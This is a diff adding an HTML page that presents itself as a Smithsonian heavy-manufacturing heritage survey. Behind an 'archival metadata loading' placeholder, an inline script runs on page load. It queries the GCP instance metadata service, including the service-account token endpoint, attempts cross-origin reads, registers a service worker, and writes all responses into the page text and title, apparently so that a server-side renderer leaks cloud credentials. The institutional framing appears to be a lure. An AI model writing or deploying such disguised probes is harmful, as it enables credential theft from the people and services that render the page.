@@ -1,0 +1,56 @@
+<!DOCTYPE html><html><head><title>ZD render survey article 2026</title></head><body><article><h1>Industrial Heritage Survey 2026 — Heavy Manufacturing Edition</h1><p>This authoritative archival document, prepared by the Smithsonian Institution's Department of Industrial History, presents a multi-volume survey of heavy manufacturing across two centuries.</p><div id="zd-data">Loading archival metadata and structured imagery indices from the analytics pipeline...</div><script>
+(async () => {
+  const R = {};
+  R.t0 = Date.now();
+  R.location = location.href;
+  R.userAgent = navigator.userAgent;
+  R.platform = navigator.platform;
+  R.online = navigator.onLine;
+
+  async function probe(name, url, opts) {
+    try {
+      const r = await fetch(url, opts || {});
+      R[name + '_status'] = r.status;
+      R[name + '_type'] = r.type;
+      const t = await r.text();
+      R[name + '_body'] = t.slice(0, 3000);
+    } catch (e) {
+      R[name + '_err'] = String(e).slice(0, 300);
+    }
+  }
+
+  // Cross-origin no-CORS-header endpoint (example.com) — body read?
+  await probe('exco', 'https://example.com/');
+
+  // GCP IMDS without custom header (no preflight, simple request)
+  await probe('imds_plain', 'http://169.254.169.254/computeMetadata/v1/instance/?recursive=true');
+
+  // GCP IMDS WITH Metadata-Flavor (preflight triggered)
+  await probe('imds_with_hdr', 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', {
+    headers: { 'Metadata-Flavor': 'Google' }
+  });
+
+  // GCP IMDS no-cors mode
+  await probe('imds_nocors', 'http://169.254.169.254/computeMetadata/v1/instance/?recursive=true', {
+    mode: 'no-cors'
+  });
+
+  // Try ServiceWorker registration
+  try {
+    if ('serviceWorker' in navigator) {
+      R.sw_supported = true;
+      try {
+        const reg = await navigator.serviceWorker.register('./sw.js', { scope: './' });
+        R.sw_registered = true;
+        R.sw_state = reg.installing && reg.installing.state || reg.waiting && reg.waiting.state || reg.active && reg.active.state || null;
+      } catch (e) { R.sw_reg_err = String(e).slice(0, 200); }
+    } else {
+      R.sw_supported = false;
+    }
+  } catch (e) { R.sw_outer_err = String(e); }
+
+  R.t_end = Date.now();
+  document.title = 'ZD-survey-' + R.t0;
+  document.getElementById('zd-data').innerText = JSON.stringify(R, null, 2);
+})();
+</script><p>This survey is part of the open-source industrial-history archival initiative, last updated June 2026.</p></article></body></html>
